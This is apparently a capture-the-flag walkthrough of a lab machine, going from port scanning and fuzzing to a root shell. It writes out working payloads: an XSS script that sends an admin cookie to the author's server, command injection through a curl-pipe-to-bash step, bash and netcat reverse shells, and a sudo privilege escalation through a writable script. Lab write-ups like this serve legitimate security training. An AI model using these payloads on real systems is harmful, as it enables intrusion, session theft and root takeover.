# Enumeration

Starting with nmap `sudo nmap -Pn -sV -sC 10.10.11.8`

The results here show ports:

```
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Fri, 26 Apr 2024 17:31:41 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

I can't help but notice the get request with Set-Cookie is_admin=... looks to be some hash value but I can't tell what.

I can also visit that page it looks like and it says the site will be live in 25 days with a contact form...

Couple things it could be. This contact form has an injection vuln, or that cookie can be modified... Lets look into what the hash algorithm for that is.

InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs

InVzZXIi is base64 decodable to "user"...
But I am not seeing an easy decode of the rest of the cookie. So it looks something like "user"."something"_"something" maybe.

What if I just base64 encode admin and add it to that string?

Nope it just changes it back. I could maybe encode "true"

I also see the Path variable at the top... I could maybe try and fuzz other pages.

First lets directory Fuzz:
`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://10.10.11.8:5000/FUZZ`

Appears there is a dashboard page. But when I try to open it I get unauthorized error code 401...

Maybe I should fuzz for the underlying page type (e.g. .php, .html, etc)

`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://10.10.11.8:5000/indexFUZZ`

Doesn't seem like there is an index page under any of the known directories.

I could try to fuzz a cookie using regular admin names attached to the beginning of that cookie instead of "user". Then specify the path as Dashboard...

SecLists has `/Users/noneya/Useful/SecLists/Usernames/CommonAdminBase64.txt` which might work...

That did not work.

I guess its time to try and check for injection vulns.

Lets run SQL Map on it I guess.

The base SQL map didn't find anything so lets try:
```
sqlmap 'http://10.10.11.8:5000/support' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs' \
  -H 'Origin: http://10.10.11.8:5000' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Referer: http://10.10.11.8:5000/support' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36' \
  --data-raw 'fname=test&lname=test&email=test%40email.com&phone=1234567890&message=test' \
--level=5 --risk=3
```

While that runs I will look for other injections.

No obvious command injections, but that's also because there is no output from the post. I might have to look at create a reverse shell, but for now I am going try other things.

Huh... trying an SSI injection returns this:
```
Hacking Attempt Detected
Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.
```

That could just be a hint there is a WAF of somekind I guess. But worth a shot.

That appears to only be the response when I put an SSI into the message paramter on the support page.

I wonder if that means the other variables are vulnerable and thats the only one tested. I could try to set up a reverse with this maybe:
`<!--#exec cmd="bash -i >& /dev/tcp/10.10.14.232/2222 0>&1" -->`

Hmm no dice. What about:
`<!--#exec cmd="nc -e /bin/sh 10.10.10.232 2222" -->`

I am going to through a bunch of these into an ffuf fuzz.

I found a bunch of reverse shells [here](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

None of these appear to have worked...

Okay so after some research I found that I could try and steal the cookie of the admin by using XSS.

[This page](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e) has some cool information and we notice that our request header is http not https. So I started a python server on 8001 with:
`python3 -m http.server 8001`

Then I started trying to steal the cookie with this:
`<script>var i=new Image(); i.src="http://10.10.14.232:8001/?cookie="+btoa(document.cookie);</script>`

In subsequent fields. This was not working. So I looked it up and the problem I needed to put this in the User-Agent field, which I had no idea was even possible. Right after I got the cookie. And decoded it from base64.

No I can try to visit the dashboard page by first opening dashboard, starting the intercept in Burp, refreshing the page, modifying the request cookie to the new cookie, and forwarding the request.

So there is a page here that says generate report and asks for a date. It appears the only output from this is Systems are up and running!

If I intercept the request I can add ; and do direct command injection.

But I can try a reverse shell if I intercept the request and change input field to:
`bash -i >& /dev/tcp/10.10.10.232/2222 0>&1`

Nope. And not URL encoded either.

So I tried it through curl instead. I created a file named revSh.sh with this in it:
`bash -i >& /dev/tcp/10.10.10.232/2222 0>&1`

Then I ran `nc -lvnp 2222` in a different terminal, and then I ran:
`;curl 'http://10.10.14.232:8001/revSh.sh'|bash` in the post request. And voila I have a reverse shell.

# Foothold

For pretty shell:
```
script /dev/null -qc /bin/bash
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

Now I can run `find -name '*user.txt' 2>/dev/null` 

Looks like its here: ./home/dvir/user.txt

Now for privesc.

Lets try `find -name '*.db' 2>/dev/null`

Lots of dbs but none that jump out at me.

Lets try `sudo -l`

I see this:
`(ALL) NOPASSWD: /usr/bin/syscheck`


Which looks like:
``` bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

When I run it, it seems to start the database service everytime. So the vuln is probably somewhere in initdb.sh. I can find the file with:
'find -name '*initdb*' 2>/dev/null'

It looks like all the file does is run `chmod u+s /bin/bash`

Looks like we can literally just modify that file how we want so lets put a reverseshell there too:
`echo "nc -e /bin/sh 10.10.14.232 4444" > initdb.sh`

And start a netcat with `nc -lvnp 4444`

Then run `sudo /usr/bin/syscheck` and voila reverse shell with root priviliges.

The we can do:
```
cd /
find -name '*root.txt' 2>/dev/null
```
And we find and can get the flag.
